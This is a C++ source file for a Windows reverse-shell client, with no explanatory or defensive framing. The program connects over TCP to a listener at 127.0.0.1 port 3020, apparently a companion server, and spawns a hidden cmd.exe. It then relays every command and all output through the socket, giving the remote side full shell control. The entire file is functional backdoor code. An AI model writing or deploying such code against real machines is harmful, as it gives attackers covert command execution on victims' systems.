// ReverseShellClient.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "ReverseShellClient.h"
#pragma comment (lib, "Ws2_32.lib")

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <iostream>
#include <WinSock2.h>

using namespace std;

#define MAX_PATH_BUFFER 300
#define MAX_BUFFER	4096
typedef HANDLE PIPE;

typedef struct mHandles
{
	mHandles(SOCKET& _sock, PIPE& _pipe) :sock(_sock), pipe(_pipe) {};
	SOCKET& sock;
	PIPE& pipe;
};

void readFromSocket(mHandles& handles);

bool running;

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{

	Sleep(200); //Give time to RemoteShellServer to set-up the server socket
	
	//Socket Setup
	SOCKADDR_IN server;
	SOCKET sockClient;
	WSADATA wsaData;
	//char inputUser[MAX_INPUT_BUFFER];
	int iResult;
	unsigned short port = 3020;


	WSAStartup(MAKEWORD(2, 2), &wsaData);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr("127.0.0.1");
	server.sin_port = htons(port);
	sockClient = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	iResult = connect(sockClient, (SOCKADDR*)&server, sizeof(SOCKADDR_IN));
	if (iResult == SOCKET_ERROR)
		return 1;

	//Process Setup
	SECURITY_ATTRIBUTES secAttrs;
	STARTUPINFOA sInfo = { 0 };
	PROCESS_INFORMATION pInfo = { 0 };
	PIPE pipeInWrite, pipeInRead, pipeOutWrite, pipeOutRead;
	char cmdPath[MAX_PATH_BUFFER];
	char outBuffer[MAX_BUFFER];
	DWORD bytesReadFromPipe;

	secAttrs.nLength = sizeof(SECURITY_ATTRIBUTES);
	secAttrs.bInheritHandle = TRUE;
	secAttrs.lpSecurityDescriptor = NULL;

	CreatePipe(&pipeInWrite, &pipeInRead, &secAttrs, 0);
	CreatePipe(&pipeOutWrite, &pipeOutRead, &secAttrs, 0);
	GetEnvironmentVariableA("ComSpec", cmdPath, sizeof(cmdPath));

	sInfo.cb = sizeof(STARTUPINFO);
	sInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	sInfo.wShowWindow = SW_HIDE;
	sInfo.hStdInput = pipeOutWrite;
	sInfo.hStdOutput = pipeInRead;
	sInfo.hStdError = pipeInRead;

	CreateProcessA(NULL, cmdPath, &secAttrs, &secAttrs, TRUE, 0, NULL, NULL, &sInfo, &pInfo);
	mHandles handles = { sockClient, pipeOutRead };

	CreateThread(&secAttrs, NULL, (LPTHREAD_START_ROUTINE)readFromSocket, &handles, NULL, NULL);
	running = true;
	while (sockClient != SOCKET_ERROR && running == true)
	{
		memset(outBuffer, 0, sizeof(outBuffer));
		PeekNamedPipe(pipeInWrite, NULL, NULL, NULL, &bytesReadFromPipe, NULL);
		while (bytesReadFromPipe)
		{
			if (!ReadFile(pipeInWrite, outBuffer, sizeof(outBuffer), &bytesReadFromPipe, NULL))
				break;
			else
			{
				send(sockClient, outBuffer, bytesReadFromPipe, NULL);
			}
			PeekNamedPipe(pipeInWrite, NULL, NULL, NULL, &bytesReadFromPipe, NULL);
		}
	}

	closesocket(sockClient);
	TerminateProcess(pInfo.hProcess, 0);
	
}


void readFromSocket(mHandles& handleStruct)
{
	int bytesReadFromSock;
	int iResult;
	DWORD bytesReadFromPipe;
	char outBuffer[MAX_BUFFER];
	while (true)
	{
		bytesReadFromSock = recv(handleStruct.sock, outBuffer, sizeof(outBuffer), 0);
		if (bytesReadFromSock == -1)
		{
			running = false;
			closesocket(handleStruct.sock);
			return;
		}
		outBuffer[bytesReadFromSock] = '\0';
		if (_stricmp("exit\n", outBuffer) == 0)
		{
			running = false;
			closesocket(handleStruct.sock);
			return;
		}
		WriteFile(handleStruct.pipe, outBuffer, bytesReadFromSock, &bytesReadFromPipe, NULL);
	}
}